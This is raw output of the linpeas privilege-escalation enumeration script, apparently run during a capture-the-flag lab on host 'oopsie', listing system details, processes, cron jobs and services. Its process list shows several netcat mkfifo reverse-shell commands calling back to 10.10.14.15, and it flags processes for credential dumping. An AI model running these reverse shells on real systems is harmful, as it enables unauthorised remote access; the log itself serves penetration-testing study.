

                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄ 
             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    linpeas v3.2.6 by carlospolop
                                                                                                                    
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                    
                                                                                                                    
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                            
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020
User & Groups: uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
Hostname: oopsie
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                           
                                                                                                                    

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                    
════════════════════════════════════╣ System Information ╠════════════════════════════════════
╔══════════╣ Operative system                                                                                       
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                       
Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.3 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                          
Sudo version 1.8.21p2                                                                                               

╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                                                                              
                                                                                                                    
╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                  
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date
Thu Jul  8 07:57:33 UTC 2021                                                                                        

╔══════════╣ System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                    
udev            967M     0  967M   0% /dev
tmpfs           200M  1.2M  199M   1% /run
/dev/sda2        20G  5.1G   14G  27% /
tmpfs           997M  452K  997M   1% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           997M     0  997M   0% /sys/fs/cgroup
/dev/loop0       90M   90M     0 100% /snap/core/8268
/dev/loop1       89M   89M     0 100% /snap/core/7270
tmpfs           200M     0  200M   0% /run/user/1000
              total        used        free      shared  buff/cache   available
Mem:        2041288      356232      676640        3232     1008416     1494360
Swap:       2097148           0     2097148

╔══════════╣ CPU info
Architecture:        x86_64                                                                                         
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              2
On-line CPU(s) list: 0,1
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           2
NUMA node(s):        1
Vendor ID:           AuthenticAMD
CPU family:          23
Model:               1
Model name:          AMD EPYC 7401P 24-Core Processor
Stepping:            2
CPU MHz:             2000.000
BogoMIPS:            4000.00
Hypervisor vendor:   VMware
Virtualization type: full
L1d cache:           32K
L1i cache:           64K
L2 cache:            512K
L3 cache:            65536K
NUMA node0 CPU(s):   0,1
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                             
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.10.14.15 38434 10.10.10.28 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
OLDPWD=/home/robert
XDG_SESSION_ID=91
USER=robert
PWD=/dev/shm
HOME=/home/robert
SSH_CLIENT=10.10.14.15 38434 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
HISTFILE=/dev/null
SSH_TTY=/dev/pts/2
MAIL=/var/mail/robert
SHELL=/bin/bash
TERM=xterm-256color
SHLVL=2
LOGNAME=robert
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
HISTSIZE=0
HISTFILESIZE=0
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env

╔══════════╣ Searching Signature verification failed in dmseg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                   
                                                                                                                    
╔══════════╣ Linux Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                       
apparmor module is loaded.
═╣ grsecurity present? ............ ═╣ PaX bins present? .............. ═╣ Execshield enabled? ............ ═╣ SELinux enabled? ............... ═╣ Is ASLR enabled? ............... Yes                                                 
═╣ Printer? ....................... ═╣ Is this a virtual machine? ..... Yes (vmware)

════════════════════════════════════╣ Containers ╠════════════════════════════════════
╔══════════╣ Container related tools present                                                                        
/usr/bin/lxc                                                                                                        
╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                              
═╣ Any running containers? ........ No                                                                              
                                                                                                                    
════════════════════════════════════╣ Devices ╠════════════════════════════════════
╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)                                                                 
disk                                                                                                                
sda
sda1
sda2

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                           
UUID=b49fb162-bc9b-4c2e-9e3c-2ba5c6bae1a7 / ext4 defaults 0 0                                                       
/swap.img       none    swap    sw      0       0


════════════════════════════════════╣ Available Software ╠════════════════════════════════════
╔══════════╣ Useful software                                                                                        
/usr/bin/lxc                                                                                                        
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/gcc
/usr/bin/base64
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

╔══════════╣ Installed Compiler
ii  gcc                                   4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                 7.4.0-1ubuntu1~18.04.1                          amd64        GNU C compiler
/usr/bin/gcc


════════════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════════                                                                                                                 
╔══════════╣ Cleaned processes                                                                                      
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                  
root         1  0.0  0.4 159712  9060 ?        Ss   02:01   0:03 /sbin/init auto automatic-ubiquity noprompt        
root       409  0.0  0.8 111296 17392 ?        S<s  02:01   0:00 /lib/systemd/systemd-journald
root       414  0.0  0.0  97708  1812 ?        Ss   02:01   0:00 /sbin/lvmetad -f
root       439  0.0  0.2  47240  6028 ?        Ss   02:01   0:01 /lib/systemd/systemd-udevd
systemd+   500  0.0  0.1 141932  3092 ?        Ssl  02:01   0:01 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root       545  0.0  0.4  89860 10124 ?        Ss   02:01   0:00 /usr/bin/VGAuthService
root       546  0.0  0.3 216924  7076 ?        Ssl  02:01   0:14 /usr/bin/vmtoolsd
systemd+   756  0.0  0.2  71852  5236 ?        Ss   02:01   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   814  0.0  0.2  70636  5312 ?        Ss   02:01   0:01 /lib/systemd/systemd-resolved
root       941  0.0  0.1  30028  3252 ?        Ss   02:01   0:00 /usr/sbin/cron -f
message+   942  0.0  0.2  50168  4812 ?        Ss   02:01   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       961  0.0  0.8 169104 17088 ?        Ssl  02:01   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       965  0.0  0.2  70592  5980 ?        Ss   02:01   0:00 /lib/systemd/systemd-logind
root       973  0.0  1.2 779876 25696 ?        Ssl  02:01   0:01 /usr/lib/snapd/snapd
root       976  0.0  0.3 286256  6880 ?        Ssl  02:01   0:00 /usr/lib/accountsservice/accounts-daemon[0m
daemon[0m     977  0.0  0.1  28332  2472 ?        Ss   02:01   0:00 /usr/sbin/atd -f
root       984  0.0  0.1 531084  2280 ?        Ssl  02:01   0:03 /usr/bin/lxcfs /var/lib/lxcfs/
syslog     985  0.0  0.2 263040  4600 ?        Ssl  02:01   0:00 /usr/sbin/rsyslogd -n
root      1052  0.0  0.1 110548  2052 ?        Ssl  02:01   0:00 /usr/sbin/irqbalance --foreground
root      1092  0.0  0.9 185952 20152 ?        Ssl  02:01   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1094  0.0  0.3 288884  6476 ?        Ssl  02:01   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1157  0.0  0.0  14888  1996 tty1     Ss+  02:01   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1203  0.0  0.3  72300  6420 ?        Ss   02:01   0:00 /usr/sbin/sshd -D
robert   23228  0.0  0.2 108124  5712 ?        S    07:56   0:00      _ sshd: robert@pts/2
robert   23236  0.0  0.2  21460  5376 pts/2    Ss   07:56   0:00          _ -bash
robert   23256  0.8  0.2  12660  4336 pts/2    S+   07:57   0:00              _ bash linpeas.sh
robert   24283  0.0  0.1  12660  3108 pts/2    S+   07:57   0:00                  _ bash linpeas.sh
robert   24286  0.0  0.1  38528  3860 pts/2    R+   07:57   0:00                  |   _ ps fauxwww
robert   24287  0.0  0.0  12660  1404 pts/2    S+   07:57   0:00                  _ bash linpeas.sh
mysql     1230  0.0  9.3 1424276 190108 ?      Sl   02:01   0:08 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root      1263  0.0  0.9 333792 18604 ?        Ss   02:01   0:00 /usr/sbin/apache2 -k start
www-data 18918  0.0  0.7 338836 14716 ?        S    06:44   0:00  _ /usr/sbin/apache2 -k start
www-data 18919  0.0  0.6 338852 13320 ?        S    06:44   0:00  _ /usr/sbin/apache2 -k start
www-data 18949  0.0  0.6 338828 14236 ?        S    06:47   0:00  _ /usr/sbin/apache2 -k start
www-data 18954  0.0  0.6 338836 14160 ?        S    06:47   0:00  _ /usr/sbin/apache2 -k start
www-data 18956  0.0  0.6 338964 13660 ?        S    06:47   0:00  _ /usr/sbin/apache2 -k start
www-data 18985  0.0  0.6 338828 14200 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data 19134  0.0  0.0   4628   816 ?        S    07:35   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9001 >/tmp/f
www-data 19137  0.0  0.0   4672   820 ?        S    07:35   0:00  |       _ cat /tmp/f
www-data 19138  0.0  0.0   4628   772 ?        S    07:35   0:00  |       _ /bin/sh -i
www-data 19145  0.0  0.4  37292  9268 ?        S    07:37   0:00  |       |   _ python3 -c import pty;pty.spawn("/bin/bash");
www-data 19146  0.0  0.1  18508  3460 pts/0    Ss+  07:37   0:00  |       |       _ /bin/bash
www-data 19139  0.0  0.1  15716  2188 ?        S    07:35   0:00  |       _ nc 10.10.14.15 9001
www-data 18990  0.0  0.6 338844 13880 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data 18992  0.0  0.7 338836 14796 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data 23071  0.0  0.0   4628   808 ?        S    07:50   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9002 >/tmp/f
www-data 23074  0.0  0.0   4672   884 ?        S    07:50   0:00  |       _ cat /tmp/f
www-data 23075  0.0  0.0   4628  1728 ?        S    07:50   0:00  |       _ /bin/sh -i
www-data 23086  0.0  0.4  37292  9444 ?        S    07:53   0:00  |       |   _ python3 -c import pty;pty.spawn("/bin/bash");
www-data 23087  0.0  0.1  18508  3340 pts/1    Ss+  07:53   0:00  |       |       _ /bin/bash
www-data 23076  0.0  0.1  15716  2224 ?        S    07:50   0:00  |       _ nc 10.10.14.15 9002
www-data 18996  0.0  0.7 338852 14324 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data 18998  0.0  0.6 338448 13244 ?        S    07:05   0:00  _ /usr/sbin/apache2 -k start
www-data 19226  0.0  0.0   4628   852 ?        S    07:39   0:00      _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9001 >/tmp/f
www-data 19229  0.0  0.0   4672   824 ?        S    07:39   0:00          _ cat /tmp/f
www-data 19230  0.0  0.0   4628   832 ?        S    07:39   0:00          _ /bin/sh -i
www-data 19231  0.0  0.1  15716  2204 ?        S    07:39   0:00          _ nc 10.10.14.15 9001
root     23712  0.0  0.0   4552   808 ?        Ss   07:40   0:00 /usr/sbin/acpid
uuidd    23726  0.0  0.0  26848  1364 ?        Ss   07:40   0:00 /usr/sbin/uuidd --socket-activation
robert   23100  0.0  0.3  76648  6976 ?        Ss   07:56   0:00 /lib/systemd/systemd --user
robert   23101  0.0  0.1 193696  2468 ?        S    07:56   0:00  _ (sd-pam)

╔══════════╣ Binary processes permissions
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                             
1.1M -rwxr-xr-x 1 root root 1.1M Jun  6  2019 /bin/bash                                                             
   0 lrwxrwxrwx 1 root root    4 Aug  5  2019 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Nov 15  2019 /lib/systemd/systemd
128K -rwxr-xr-x 1 root root 127K Nov 15  2019 /lib/systemd/systemd-journald
216K -rwxr-xr-x 1 root root 215K Nov 15  2019 /lib/systemd/systemd-logind
1.6M -rwxr-xr-x 1 root root 1.6M Nov 15  2019 /lib/systemd/systemd-networkd
372K -rwxr-xr-x 1 root root 371K Nov 15  2019 /lib/systemd/systemd-resolved
 40K -rwxr-xr-x 1 root root  39K Nov 15  2019 /lib/systemd/systemd-timesyncd
572K -rwxr-xr-x 1 root root 571K Nov 15  2019 /lib/systemd/systemd-udevd
 56K -rwxr-xr-x 1 root root  56K Aug 22  2019 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Nov 15  2019 /sbin/init -> /lib/systemd/systemd
 84K -rwxr-xr-x 1 root root  83K Dec  5  2019 /sbin/lvmetad
232K -rwxr-xr-x 1 root root 232K Jun 10  2019 /usr/bin/dbus-daemon[0m
 20K -rwxr-xr-x 1 root root  19K Nov 23  2018 /usr/bin/lxcfs
   0 lrwxrwxrwx 1 root root    9 Oct 25  2018 /usr/bin/python3 -> python3.6
128K -rwxr-xr-x 1 root root 127K Dec  9  2019 /usr/bin/VGAuthService
 56K -rwxr-xr-x 1 root root  55K Dec  9  2019 /usr/bin/vmtoolsd
180K -rwxr-xr-x 1 root root 179K Dec 18  2017 /usr/lib/accountsservice/accounts-daemon[0m
 16K -rwxr-xr-x 1 root root  15K Mar 27  2019 /usr/lib/policykit-1/polkitd
 19M -rwxr-xr-x 1 root root  19M Oct 30  2019 /usr/lib/snapd/snapd
 52K -rwxr-xr-x 1 root root  51K Apr 28  2017 /usr/sbin/acpid
656K -rwxr-xr-x 1 root root 656K Sep 16  2019 /usr/sbin/apache2
 28K -rwxr-xr-x 1 root root  27K Feb 20  2018 /usr/sbin/atd
 48K -rwxr-xr-x 1 root root  47K Nov 16  2017 /usr/sbin/cron
 64K -rwxr-xr-x 1 root root  63K Jan  9  2019 /usr/sbin/irqbalance
 24M -rwxr-xr-x 1 root root  24M Jan 21  2020 /usr/sbin/mysqld
668K -rwxr-xr-x 1 root root 665K Apr 24  2018 /usr/sbin/rsyslogd
772K -rwxr-xr-x 1 root root 769K Mar  4  2019 /usr/sbin/sshd
 36K -rwxr-xr-x 1 root root  35K Aug 22  2019 /usr/sbin/uuidd

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                  
COMMAND     PID   TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                   

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                       
apache2 process found (dump creds from memory as root)                                                              
sshd: process found (dump creds from memory as root)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                   
/usr/bin/crontab                                                                                                    
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Jan 23  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root  589 Jan 30  2019 mdadm
-rw-r--r--  1 root root  712 Jan 17  2018 php
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  191 Aug  5  2019 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 Jan 27  2020 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root  376 Nov 20  2017 apport
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  539 Jan 30  2019 mdadm
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools
-rwxr-xr-x  1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Aug  5  2019 .
drwxr-xr-x 98 root root 4096 Jan 28  2020 ..
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


╔══════════╣ Services
╚ Search for outdated versions                                                                                      
 [ + ]  acpid                                                                                                       
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  ebtables
 [ + ]  grub-common
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  mysql
 [ + ]  networking
 [ - ]  open-iscsi
 [ + ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  screen-cleanup
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ + ]  unattended-upgrades
 [ + ]  uuidd
 [ - ]  x11-common

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                           
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                         

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                              
/etc/systemd/system/multi-user.target.wants/networking.service is executing some relative path                      
/etc/systemd/system/network-online.target.wants/networking.service is executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                
NEXT                         LEFT        LAST                         PASSED       UNIT                         ACTIVATES
Thu 2021-07-08 08:09:00 UTC  11min left  Thu 2021-07-08 07:39:05 UTC  18min ago    phpsessionclean.timer        phpsessionclean.service
Thu 2021-07-08 17:00:09 UTC  9h left     Thu 2021-07-08 02:01:29 UTC  5h 56min ago apt-daily.timer              apt-daily.service
Thu 2021-07-08 19:52:49 UTC  11h left    Thu 2021-07-08 02:46:11 UTC  5h 11min ago motd-news.timer              motd-news.service
Fri 2021-07-09 02:16:35 UTC  18h left    Thu 2021-07-08 02:16:35 UTC  5h 41min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Fri 2021-07-09 06:23:35 UTC  22h left    Thu 2021-07-08 06:37:45 UTC  1h 19min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2021-07-12 00:00:00 UTC  3 days left Thu 2021-07-08 02:01:29 UTC  5h 56min ago fstrim.timer                 fstrim.service
n/a                          n/a         n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a         n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                
                                                                                                                    
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                               
                                                                                                                    
╔══════════╣ HTTP sockets
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                               
Socket /run/user/1000/snapd-session-agent.socket owned by robert uses HTTP. Response to /index:                     
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
linpeas.sh: line 1643: warning: command substitution: ignored null byte in input

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                 
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)              
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                 
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION
:1.0                                 756 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -
:1.1                                 814 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -
:1.2                                   1 systemd         root             :1.2          init.scope                -          -
